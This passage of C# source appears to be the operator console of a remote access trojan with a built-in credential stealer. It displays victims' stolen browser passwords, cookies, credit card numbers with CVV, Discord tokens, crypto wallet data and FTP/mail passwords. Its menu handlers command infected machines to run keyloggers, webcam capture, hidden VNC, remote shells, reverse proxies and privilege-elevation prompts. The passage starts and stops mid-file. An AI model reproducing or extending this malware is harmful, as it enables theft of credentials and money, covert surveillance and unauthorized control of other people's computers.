					this.StealerTabControl.Pages["CryptoinfoPage"].Text = "Crypto Info (" + this.FormatNumber(CryptoInfoLogsCount) + ")";
				else
					this.StealerTabControl.Pages["CryptoinfoPage"].Text = "Crypto Info";
			}));
			this.StealerTabControl.Invoke((MethodInvoker)(() =>
			{
				if (CryptoInfoLogsCount > 0)
					this.StealerTabControl.Pages["HistoryPage"].Text = "History (" + this.FormatNumber(HistoryLogsCount) + ")";
				else
					this.StealerTabControl.Pages["HistoryPage"].Text = "History";
			}));
			this.StealerTabControl.Invoke((MethodInvoker)(() =>
			{
				if (CryptoInfoLogsCount > 0)
					this.StealerTabControl.Pages["DownloadsPage"].Text = "Downloads (" + this.FormatNumber(DownloadsLogsCount) + ")";
				else
					this.StealerTabControl.Pages["DownloadsPage"].Text = "Downloads";
			}));
			this.StealerAppsTabControl.Invoke((MethodInvoker)(() =>
			{
				if (TokensLogsCount > 0)
					this.StealerAppsTabControl.TabPages["TokensPage"].Text = "Tokens (" + this.FormatNumber(TokensLogsCount) + ")";
				else
					this.StealerAppsTabControl.TabPages["TokensPage"].Text = "Tokens";
			}));
			this.StealerTabControl.Invoke((MethodInvoker)(() =>
			{
				if (TotalAppsCount > 0)
					this.StealerTabControl.Pages["AppsPage"].Text = "Apps (" + this.FormatNumber(TotalAppsCount) + ")";
				else
					this.StealerTabControl.Pages["AppsPage"].Text = "Apps";
			}));
			this.StealerTabControl.Invoke((MethodInvoker)(() =>
			{
				if (TotalLogsCount > 0)
					this.TabsControl.Pages["StealerLogsPage"].Text = "Stealer Logs (" + this.FormatNumber(TotalLogsCount) + ")";
				else
					this.TabsControl.Pages["StealerLogsPage"].Text = "Stealer Logs";
			}));
			this.StealerAppsTabControl.TabButtonIdleState.ForeColor = Color.White;
			this.StealerAppsTabControl.TabButtonSelectedState.ForeColor = Color.White;
		}

		private void AddStealerLogThreaded(Client client, StealerLog data)
		{
			if (!data.appsData.Equals((object)new AppsData()))
			{
				if (data.appsData.DiscordUserDatas != null)
				{
					try
					{
						foreach (DiscordUserData discordUserData in data.appsData.DiscordUserDatas)
						{
							DiscordUserData discordUser = discordUserData;
							this.StealerTokensDataGridView.Invoke((MethodInvoker)(() => this.StealerTokensDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)discordUser.id, (object)discordUser.username, (object)discordUser.hasNitro, (object)discordUser.email, (object)discordUser.phoneNumber, (object)discordUser.token)));
						}
					}
					catch
					{
					}
				}
			}
			if (!data.appsData.Equals((object)new AppsData()))
			{
				if (data.appsData.cryptoInfos != null)
				{
					try
					{
						foreach (CryptoInfo cryptoInfo1 in data.appsData.cryptoInfos)
						{
							CryptoInfo cryptoInfo = cryptoInfo1;
							this.StealerCryptoInfoDataGridView.Invoke((MethodInvoker)(() => this.StealerCryptoInfoDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)cryptoInfo.name, (object)cryptoInfo.path, (object)cryptoInfo.isFile)));
						}
					}
					catch
					{
					}
				}
			}
			if (!data.appsData.Equals((object)new AppsData()))
			{
				if (data.appsData.obsInfos != null)
				{
					try
					{
						foreach (OBSInfo obsInfo1 in data.appsData.obsInfos)
						{
							OBSInfo obsInfo = obsInfo1;
							this.StealerObsDataGridView.Invoke((MethodInvoker)(() => this.StealerObsDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)obsInfo.service, (object)obsInfo.streamKey)));
						}
					}
					catch
					{
					}
				}
			}
			if (!data.appsData.Equals((object)new AppsData()))
			{
				if (data.appsData.filezillaInfos != null)
				{
					try
					{
						foreach (FileZillaInfo filezillaInfo1 in data.appsData.filezillaInfos)
						{
							FileZillaInfo filezillaInfo = filezillaInfo1;
							this.StealerFilezillaDataGridView.Invoke((MethodInvoker)(() => this.StealerFilezillaDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)filezillaInfo.host, (object)filezillaInfo.port, (object)filezillaInfo.username, (object)filezillaInfo.password)));
						}
					}
					catch (Exception )
					{
					}
				}
			}
			if (!data.appsData.Equals((object)new AppsData()))
			{
				if (data.appsData.foxMailInfos != null)
				{
					try
					{
						foreach (FoxMailInfo foxMailInfo1 in data.appsData.foxMailInfos)
						{
							FoxMailInfo foxMailInfo = foxMailInfo1;
							this.StealerFoxmailDataGridView.Invoke((MethodInvoker)(() => this.StealerFoxmailDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)foxMailInfo.account, (object)foxMailInfo.password, (object)foxMailInfo.pop3)));
						}
					}
					catch
					{
					}
				}
			}
			if (!data.appsData.Equals((object)new AppsData()))
			{
				if (data.appsData.winscpInfos != null)
				{
					try
					{
						foreach (WinScpInfo winscpInfo1 in data.appsData.winscpInfos)
						{
							WinScpInfo winscpInfo = winscpInfo1;
							this.StealerWinscpDataGridView.Invoke((MethodInvoker)(() => this.StealerWinscpDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)winscpInfo.hostname, (object)winscpInfo.port, (object)winscpInfo.username, (object)winscpInfo.password)));
						}
					}
					catch
					{
					}
				}
			}
			if (data.chromiumData != null)
			{
				foreach (ChromiumBrowser chromiumBrowser in data.chromiumData)
				{
					if (!chromiumBrowser.Equals((object)new ChromiumBrowser()))
					{
						string browserName = chromiumBrowser.browserName;
						if (chromiumBrowser.profiles != null)
						{
							foreach (ChromiumProfile profile in chromiumBrowser.profiles)
							{
								if (!profile.Equals((object)new ChromiumProfile()))
								{
									string profileName = profile.profileName;
									try
									{
										foreach (Login login1 in profile.logins)
										{
											Login login = login1;
											this.StealerLoginsDataGridView.Invoke((MethodInvoker)(() => this.StealerLoginsDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)(browserName + "/" + profileName), (object)login.hostname, (object)login.username, (object)login.password)));
										}
									}
									catch
									{
									}
									try
									{
										foreach (AutoFill autofill1 in profile.autofills)
										{
											AutoFill autofill = autofill1;
											this.StealerAutofillsDataGridView.Invoke((MethodInvoker)(() => this.StealerAutofillsDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)(browserName + "/" + profileName), (object)autofill.name, (object)autofill.value)));
										}
									}
									catch
									{
									}
									try
									{
										foreach (Cookie cookie1 in profile.cookies)
										{
											Cookie cookie = cookie1;
											this.StealerCookiesDataGridView.Invoke((MethodInvoker)(() => this.StealerCookiesDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)(browserName + "/" + profileName), (object)cookie.domain, (object)cookie.name, (object)cookie.path, (object)cookie.value, (object)cookie.expired)));
										}
									}
									catch
									{
									}
									try
									{
										foreach (ChromiumCreditCard creditCard in profile.creditCards)
										{
											ChromiumCreditCard card = creditCard;
											if (!card.Equals((object)new ChromiumCreditCard()))
												this.StealerCardsDataGridView.Invoke((MethodInvoker)(() => this.StealerCardsDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)(browserName + "/" + profileName), (object)card.cardholderName, (object)card.cardNumber, (object)card.expirationMonth, (object)card.expirationYear, (object)card.cvv)));
										}
									}
									catch
									{
									}
									try
									{
										foreach (ChromiumCryptoExtension cryptoExtension in profile.cryptoExtensions)
										{
											ChromiumCryptoExtension extension = cryptoExtension;
											this.StealerCryptoInfoDataGridView.Invoke((MethodInvoker)(() => this.StealerCryptoInfoDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)extension.name, (object)extension.path, (object)("Extension: " + browserName + "/" + profileName))));
										}
									}
									catch
									{
									}
									try
									{
										foreach (HistoryEntry historyEntry in profile.history)
										{
											HistoryEntry history = historyEntry;
											this.StealerHistoryDataGridView.Invoke((MethodInvoker)(() => this.StealerHistoryDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)(browserName + "/" + profileName), (object)history.url, (object)history.title)));
										}
									}
									catch
									{
									}
									try
									{
										foreach (Download download1 in profile.downloads)
										{
											Download download = download1;
											this.StealerDownloadsDataGridView.Invoke((MethodInvoker)(() => this.StealerDownloadsDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)(browserName + "/" + profileName), (object)download.path, (object)download.url)));
										}
									}
									catch
									{
									}
								}
							}
						}
					}
				}
			}
			if (data.geckoData != null)
			{
				foreach (GeckoBrowser geckoBrowser in data.geckoData)
				{
					string browserName = geckoBrowser.browserName;
					foreach (GeckoProfile profile in geckoBrowser.profiles)
					{
						string profileName = profile.profileName;
						try
						{
							foreach (Login login2 in profile.logins)
							{
								Login login = login2;
								this.StealerLoginsDataGridView.Invoke((MethodInvoker)(() => this.StealerLoginsDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)(browserName + "/" + profileName), (object)login.hostname, (object)login.username, (object)login.password)));
							}
						}
						catch
						{
						}
						try
						{
							foreach (AutoFill autofill2 in profile.autofills)
							{
								AutoFill autofill = autofill2;
								this.StealerAutofillsDataGridView.Invoke((MethodInvoker)(() => this.StealerAutofillsDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)(browserName + "/" + profileName), (object)autofill.name, (object)autofill.value)));
							}
						}
						catch
						{
						}
						try
						{
							foreach (Cookie cookie2 in profile.cookies)
							{
								Cookie cookie = cookie2;
								this.StealerCookiesDataGridView.Invoke((MethodInvoker)(() => this.StealerCookiesDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)(browserName + "/" + profileName), (object)cookie.domain, (object)cookie.name, (object)cookie.path, (object)cookie.value, (object)cookie.expired)));
							}
						}
						catch
						{
						}
						try
						{
							foreach (GeckoCreditCard creditCard in profile.creditCards)
							{
								GeckoCreditCard card = creditCard;
								this.StealerCardsDataGridView.Invoke((MethodInvoker)(() => this.StealerCardsDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)(browserName + "/" + profileName), (object)card.cardholderName, (object)card.cardNumber, (object)card.expirationMonth, (object)card.expirationYear, (object)card.cardType)));
							}
						}
						catch
						{
						}
						try
						{
							foreach (HistoryEntry historyEntry in profile.history)
							{
								HistoryEntry history = historyEntry;
								this.StealerHistoryDataGridView.Invoke((MethodInvoker)(() => this.StealerHistoryDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)(browserName + "/" + profileName), (object)history.url, (object)history.title)));
							}
						}
						catch
						{
						}
						try
						{
							foreach (Download download2 in profile.downloads)
							{
								Download download = download2;
								this.StealerDownloadsDataGridView.Invoke((MethodInvoker)(() => this.StealerDownloadsDataGridView.Rows.Insert(0, (object)client.Value.UserAtPc, (object)(browserName + "/" + profileName), (object)download.path, (object)download.url)));
							}
						}
						catch
						{
						}
					}
				}
			}
			this.UpdateStealerLogsTitles();
			this.EventLogDataGridView.ClearSelection();
		}

		private void AddClientToDataView(Client client)
		{
			if (client == null)
				return;
			this.AddEventLog("Client Connected [" + client.Value.UserAtPc + "]", '+');
			try
			{
				this.ClientsDataGridView.Invoke((MethodInvoker)(() =>
				{
					lock (this._lockClients)
					{
						DataGridViewRow dataGridViewRow = this.ClientsDataGridView.Rows.Cast<DataGridViewRow>().FirstOrDefault<DataGridViewRow>((Func<DataGridViewRow, bool>)(item => item != null && client.Equals(item.Tag)));
						if (dataGridViewRow != null)
						{
							this.UpdateDynamicClientRowvalues(client, dataGridViewRow);
							if (!((string)dataGridViewRow.Cells["StatusCol"].Value == "Offline"))
								return;
							this.ClientsDataGridView.Rows.Remove(dataGridViewRow);
						}
						else if (this.ClientsDataGridView.Rows.Cast<DataGridViewRow>().Any<DataGridViewRow>((Func<DataGridViewRow, bool>)(item => (string)item.Cells["UserCol"].Value == client.Value.UserAtPc && (string)item.Cells["StatusCol"].Value == "Offline")))
						{
							DataGridViewRow row = this.ClientsDataGridView.Rows.Cast<DataGridViewRow>().FirstOrDefault<DataGridViewRow>((Func<DataGridViewRow, bool>)(item => (string)item.Cells["UserCol"].Value == client.Value.UserAtPc && (string)item.Cells["StatusCol"].Value == "Offline"));
							if (row == null)
								return;
							this.UpdateDynamicClientRowvalues(client, row);
						}
						else
							this.UpdateDynamicClientRowvalues(client, this.ClientsDataGridView.Rows[this.ClientsDataGridView.Rows.Add()]);
					}
				}));
				this.ClearAutoSelection((DataGridView)this.ClientsDataGridView);
			}
			catch (InvalidOperationException)
			{
			}
			this.UpdateClientNumber();
		}

		private void UpdateDynamicClientRowvalues(Client client, DataGridViewRow row)
		{
			row.Cells["IPCol"].Value = (object)client.EndPoint.Address.ToString();
			row.Cells["TagCol"].Value = (object)client.Value.Tag;
			row.Cells["UserCol"].Value = (object)client.Value.UserAtPc;
			row.Cells["VersionCol"].Value = (object)client.Value.Version;
			row.Cells["UserStatusCol"].Value = (object)"Active";
			row.Cells["CountryCol"].Value = (object)client.Value.CountryWithCode;
			row.Cells["OSCol"].Value = (object)client.Value.OperatingSystem;
			row.Cells["AccounttypeCol"].Value = (object)client.Value.AccountType;
			row.Tag = (object)client;
			if (client.Connected)
			{
				row.Cells["StatusCol"].Value = (object)"Online";
				row.Cells["StatusCol"].Style.ForeColor = Color.LightGreen;
			}
			else
			{
				row.Cells["StatusCol"].Value = (object)"Offline";
				row.Cells["StatusCol"].Style.ForeColor = Color.Red;
			}
			row.Cells["VersionCol"].Style.ForeColor = !(client.Value.Version != FrmMain.version) ? Color.LightGreen : Color.Red;
			row.Cells["AccounttypeCol"].Style.ForeColor = !(client.Value.AccountType == "Admin") ? Color.White : Color.DarkOrange;
			row.Cells["FlagCol"].Value = (object)this.imgFlags.Images[client.Value.ImageIndex];
		}

		private void UpdateClientStatusInListview(Client client, bool isConnected)
		{
			if (client == null)
				return;
			try
			{
				this.ClientsDataGridView.Invoke((MethodInvoker)(() =>
				{
					lock (this._lockClients)
					{
						using (IEnumerator<DataGridViewRow> enumerator = this.ClientsDataGridView.Rows.Cast<DataGridViewRow>().Where<DataGridViewRow>((Func<DataGridViewRow, bool>)(row => row != null && client.Equals(row.Tag))).GetEnumerator())
						{
							if (!enumerator.MoveNext())
								return;
							this.UpdateDynamicClientRowvalues(client, enumerator.Current);
						}
					}
				}));
				this.UpdateClientNumber();
			}
			catch (InvalidOperationException)
			{
			}
		}

		private void RemoveClientFromDataGridView(Client client)
		{
			if (client == null)
				return;
			try
			{
				this.ClientsDataGridView.Invoke((MethodInvoker)(() =>
				{
					lock (this._lockClients)
					{
						using (IEnumerator<DataGridViewRow> enumerator = this.ClientsDataGridView.Rows.Cast<DataGridViewRow>().Where<DataGridViewRow>((Func<DataGridViewRow, bool>)(row => row != null && client.Equals(row.Tag))).GetEnumerator())
						{
							if (!enumerator.MoveNext())
								return;
							this.ClientsDataGridView.Rows.Remove(enumerator.Current);
						}
					}
				}));
				this.UpdateClientNumber();
			}
			catch (InvalidOperationException)
			{
			}
		}

		private void SetStatusByClient(object sender, Client client, string text)
		{
			DataGridViewRow gridViewRowByClient = this.GetDataGridViewRowByClient(client);
			if (gridViewRowByClient == null)
				return;
			gridViewRowByClient.Cells["StatusCol"].Value = (object)text;
		}

		private void SetUserStatusByClient(object sender, Client client, UserStatus userStatus)
		{
			DataGridViewRow gridViewRowByClient = this.GetDataGridViewRowByClient(client);
			if (gridViewRowByClient == null)
				return;
			gridViewRowByClient.Cells["StatusCol"].Value = (object)userStatus.ToString();
		}

		private DataGridViewRow GetDataGridViewRowByClient(Client client)
		{
			if (client == null)
				return null;
			DataGridViewRow itemClient = null;
			this.ClientsDataGridView.Invoke((MethodInvoker)(() => itemClient = this.ClientsDataGridView.Rows.Cast<DataGridViewRow>().FirstOrDefault<DataGridViewRow>((Func<DataGridViewRow, bool>)(lvi => lvi != null && client.Equals(lvi.Tag)))));
			return itemClient;
		}

		private Client[] GetSelectedClients()
		{
			List<Client> clients = new List<Client>();
			this.ClientsDataGridView.Invoke((MethodInvoker)(() =>
			{
				lock (this._lockClients)
				{
					if (this.ClientsDataGridView.SelectedRows.Count == 0)
						return;
					clients.AddRange(this.ClientsDataGridView.SelectedRows.Cast<DataGridViewRow>().Where<DataGridViewRow>((Func<DataGridViewRow, bool>)(row => row != null)).Select<DataGridViewRow, Client>((Func<DataGridViewRow, Client>)(row => row.Tag as Client)));
				}
			}));
			return clients.ToArray();
		}

		private Client[] GetConnectedClients() => this.ListenServer.ConnectedClients;

		private void ShowPopup(Client c)
		{
			try
			{
				this.Invoke((MethodInvoker)(() =>
				{
					if (c == null || c.Value == null)
						return;
					this.notifyIcon.ShowBalloonTip(4000, string.Format("Client connected from {0}!", (object)c.Value.Country), string.Format("IP Address: {0}\nOperating System: {1}", (object)c.EndPoint.Address.ToString(), (object)c.Value.OperatingSystem), ToolTipIcon.Info);
				}));
			}
			catch (InvalidOperationException)
			{
			}
		}

		private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
				selectedClient.Send<DoAskElevate>(new DoAskElevate());
		}

		private void updateToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Client[] selectedClients = this.GetSelectedClients();
			if (selectedClients.Length == 0)
				return;
			new FrmRemoteExecution(selectedClients).Show();
		}

		private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
				selectedClient.Send<DoClientReconnect>(new DoClientReconnect());
		}

		private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
				selectedClient.Send<DoClientDisconnect>(new DoClientDisconnect());
		}

		private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsDataGridView.Rows.Count == 0 || MessageBox.Show(string.Format("Are you sure you want to uninstall the client on {0} computer\\s?", (object)this.ClientsDataGridView.Rows.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
				return;
			foreach (Client selectedClient in this.GetSelectedClients())
				selectedClient.Send<DoClientUninstall>(new DoClientUninstall());
		}

		private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
			{
				FrmSystemInformation newOrGetExisting = FrmSystemInformation.CreateNewOrGetExisting(selectedClient);
				newOrGetExisting.Show();
				newOrGetExisting.Focus();
			}
		}

		private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
			{
				FrmFileManager newOrGetExisting = FrmFileManager.CreateNewOrGetExisting(selectedClient);
				newOrGetExisting.Show();
				newOrGetExisting.Focus();
			}
		}

		private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
			{
				FrmStartupManager newOrGetExisting = FrmStartupManager.CreateNewOrGetExisting(selectedClient);
				newOrGetExisting.Show();
				newOrGetExisting.Focus();
			}
		}

		private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
			{
				FrmTaskManager newOrGetExisting = FrmTaskManager.CreateNewOrGetExisting(selectedClient);
				newOrGetExisting.Show();
				newOrGetExisting.Focus();
			}
		}

		private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
			{
				FrmRemoteShell newOrGetExisting = FrmRemoteShell.CreateNewOrGetExisting(selectedClient);
				newOrGetExisting.Show();
				newOrGetExisting.Focus();
			}
		}

		private void connectionsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
			{
				FrmConnections newOrGetExisting = FrmConnections.CreateNewOrGetExisting(selectedClient);
				newOrGetExisting.Show();
				newOrGetExisting.Focus();
			}
		}

		private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Client[] selectedClients = this.GetSelectedClients();
			if (selectedClients.Length == 0)
				return;
			new FrmReverseProxy(selectedClients).Show();
		}

		private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsDataGridView.Rows.Count == 0)
				return;
			foreach (Client selectedClient in this.GetSelectedClients())
			{
				FrmRegistryEditor newOrGetExisting = FrmRegistryEditor.CreateNewOrGetExisting(selectedClient);
				newOrGetExisting.Show();
				newOrGetExisting.Focus();
			}
		}

		private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
				selectedClient.Send<DoShutdownAction>(new DoShutdownAction()
				{
					Action = ShutdownAction.Shutdown
				});
		}

		private void restartToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
				selectedClient.Send<DoShutdownAction>(new DoShutdownAction()
				{
					Action = ShutdownAction.Restart
				});
		}

		private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
				selectedClient.Send<DoShutdownAction>(new DoShutdownAction()
				{
					Action = ShutdownAction.Standby
				});
		}

		private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
			{
				FrmRemoteDesktop newOrGetExisting = FrmRemoteDesktop.CreateNewOrGetExisting(selectedClient);
				newOrGetExisting.Show();
				newOrGetExisting.Focus();
			}
		}

		private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Client[] selectedClients = this.GetSelectedClients();
			if (selectedClients.Length == 0)
				return;
			new FrmPasswordRecovery(selectedClients).Show();
		}

		private void keyloggerStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
			{
				FrmKeylogger newOrGetExisting = FrmKeylogger.CreateNewOrGetExisting(selectedClient);
				newOrGetExisting.Show();
				newOrGetExisting.Focus();
			}
		}

		private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsDataGridView.Rows.Count == 0)
				return;
			using (FrmVisitWebsite frmVisitWebsite = new FrmVisitWebsite(this.ClientsDataGridView.Rows.Count))
			{
				if (frmVisitWebsite.ShowDialog() != DialogResult.OK)
					return;
				foreach (Client selectedClient in this.GetSelectedClients())
					selectedClient.Send<DoVisitWebsite>(new DoVisitWebsite()
					{
						Url = frmVisitWebsite.Url,
						Hidden = frmVisitWebsite.Hidden
					});
			}
		}

		private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsDataGridView.Rows.Count == 0)
				return;
			using (FrmShowMessagebox frmShowMessagebox = new FrmShowMessagebox(this.ClientsDataGridView.Rows.Count))
			{
				if (frmShowMessagebox.ShowDialog() != DialogResult.OK)
					return;
				foreach (Client selectedClient in this.GetSelectedClients())
					selectedClient.Send<DoShowMessageBox>(new DoShowMessageBox()
					{
						Caption = frmShowMessagebox.MsgBoxCaption,
						Text = frmShowMessagebox.MsgBoxText,
						Button = frmShowMessagebox.MsgBoxButton,
						Icon = frmShowMessagebox.MsgBoxIcon
					});
			}
		}

		private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.ClientsDataGridView.SelectAll();
		}

		private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			this.WindowState = this.WindowState == FormWindowState.Normal ? FormWindowState.Minimized : FormWindowState.Normal;
			this.ShowInTaskbar = this.WindowState == FormWindowState.Normal;
		}

		private void hVNCToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
			{
				FrmHVNC newOrGetExisting = FrmHVNC.CreateNewOrGetExisting(selectedClient);
				newOrGetExisting.Show();
				newOrGetExisting.Focus();
			}
		}

		private void webcamToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
			{
				FrmRemoteWebcam newOrGetExisting = FrmRemoteWebcam.CreateNewOrGetExisting(selectedClient);
				newOrGetExisting.Show();
				newOrGetExisting.Focus();
			}
		}

		private void stealerOptionstoolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsDataGridView.Rows.Count == 0)
				return;
			using (FrmStealerOptions frmStealerOptions = new FrmStealerOptions(this.ClientsDataGridView.Rows.Count))
			{
				if (frmStealerOptions.ShowDialog() != DialogResult.OK)
					return;
				List<Client> clientsToSend = new List<Client>();
				foreach (Client selectedClient in this.GetSelectedClients())
					clientsToSend.Add(selectedClient);
				this._stealerHandler.SendStealerRequest(clientsToSend, new GetStealerLogs()
				{
					chromiumBrowserOptions = frmStealerOptions.chromiumbrowserOptions,
					geckoBrowserOptions = frmStealerOptions.geckobrowserOptions,
					appsOptions = frmStealerOptions.appsOptions
				}, "Getting Stealer Logs");
			}
		}

		private void BrowsersToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsDataGridView.SelectedRows.Count == 0)
				return;
			List<Client> clientsToSend = new List<Client>();
			foreach (Client selectedClient in this.GetSelectedClients())
				clientsToSend.Add(selectedClient);
			this._stealerHandler.SendStealerRequest(clientsToSend, new GetStealerLogs()
			{
				chromiumBrowserOptions = ChromiumBrowserOptions.All,
				geckoBrowserOptions = GeckoBrowserOptions.All
			}, "Getting Browser Data");
		}

		private void discordTokenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsDataGridView.SelectedRows.Count == 0)
				return;
			List<Client> clientsToSend = new List<Client>();
			foreach (Client selectedClient in this.GetSelectedClients())
				clientsToSend.Add(selectedClient);
			this._stealerHandler.SendStealerRequest(clientsToSend, new GetStealerLogs()
			{
				appsOptions = AppsOptions.Discord
			}, "Grabbing Discord Tokens");
		}

		private void cryptoDataToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsDataGridView.SelectedRows.Count == 0)
				return;
			List<Client> clientsToSend = new List<Client>();
			foreach (Client selectedClient in this.GetSelectedClients())
				clientsToSend.Add(selectedClient);
			this._stealerHandler.SendStealerRequest(clientsToSend, new GetStealerLogs()
			{
				appsOptions = AppsOptions.Crypto
			}, "Getting Crypto Data");
		}

		private void telegramInfoToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsDataGridView.SelectedRows.Count == 0)
				return;
			foreach (Client selectedClient in this.GetSelectedClients())
				this.AddEventLog("[NOT SENT] Telegram data Grabber is under construction [" + selectedClient.Value.UserAtPc + "]", '-');
		}

		private void steamToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsDataGridView.SelectedRows.Count == 0)
				return;
			foreach (Client selectedClient in this.GetSelectedClients())
				this.AddEventLog("[NOT SENT] Steam data Grabber is under construction [" + selectedClient.Value.UserAtPc + "]", '-');
		}

		private void oBSKeysToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsDataGridView.SelectedRows.Count == 0)
				return;
			List<Client> clientsToSend = new List<Client>();
			foreach (Client selectedClient in this.GetSelectedClients())
				clientsToSend.Add(selectedClient);
			this._stealerHandler.SendStealerRequest(clientsToSend, new GetStealerLogs()
			{
				appsOptions = AppsOptions.Obs
			}, "Getting OBS Data");
		}

		private void ngrokAuthKeysToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsDataGridView.SelectedRows.Count == 0)
				return;
			foreach (Client selectedClient in this.GetSelectedClients())
				this.AddEventLog("[NOT SENT] Ngrok Key Grabber is under construction [" + selectedClient.Value.UserAtPc + "]", '-');
		}

		private void fileZillaToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsDataGridView.SelectedRows.Count == 0)
				return;
			List<Client> clientsToSend = new List<Client>();
			foreach (Client selectedClient in this.GetSelectedClients())
				clientsToSend.Add(selectedClient);
			this._stealerHandler.SendStealerRequest(clientsToSend, new GetStealerLogs()
			{
				appsOptions = AppsOptions.Filazilla
			}, "Getting FileZilla Data");
		}

		private void foxmailToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsDataGridView.SelectedRows.Count == 0)
				return;
			List<Client> clientsToSend = new List<Client>();
			foreach (Client selectedClient in this.GetSelectedClients())
				clientsToSend.Add(selectedClient);
			this._stealerHandler.SendStealerRequest(clientsToSend, new GetStealerLogs()
			{
				appsOptions = AppsOptions.Foxmail
			}, "Getting Foxmail Data");
		}

		private void winSCPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsDataGridView.SelectedRows.Count == 0)
				return;
			List<Client> clientsToSend = new List<Client>();
			foreach (Client selectedClient in this.GetSelectedClients())
				clientsToSend.Add(selectedClient);
			this._stealerHandler.SendStealerRequest(clientsToSend, new GetStealerLogs()
			{
				appsOptions = AppsOptions.Winscp
			}, "Getting WinSCP Data");
		}

		private void hiddenProgramToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
			{
				FrmHiddenBrowser newOrGetExisting = FrmHiddenBrowser.CreateNewOrGetExisting(selectedClient);
				newOrGetExisting.Show();
				newOrGetExisting.Focus();
			}
		}

		private void StealerDeleteLogsbtn_Click(object sender, EventArgs e)
		{
			List<DataGridView> viewsFromControl = this.FindDataGridViewsFromControl((Control)this.StealerTabControl);
			try
			{
				foreach (DataGridView dataGridView in viewsFromControl)
				{
					DataGridView DGV = dataGridView;
					DGV.Invoke((MethodInvoker)(() => DGV.Rows.Clear()));
				}
			}
			catch
			{
			}
			this.UpdateStealerLogsTitles();
		}

		private void ViewLoadedPluginsStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
			{
				FrmPlugins newOrGetExisting = FrmPlugins.CreateNewOrGetExisting(selectedClient);
				newOrGetExisting.Show();
				newOrGetExisting.Focus();
			}
		}

		private void resetSurvivalPanelToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
			{
				FrmResetSurvival newOrGetExisting = FrmResetSurvival.CreateNewOrGetExisting(selectedClient);
				newOrGetExisting.Show();
				newOrGetExisting.Focus();
			}
		}

		private void removeOfflineClientToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (Client selectedClient in this.GetSelectedClients())
			{
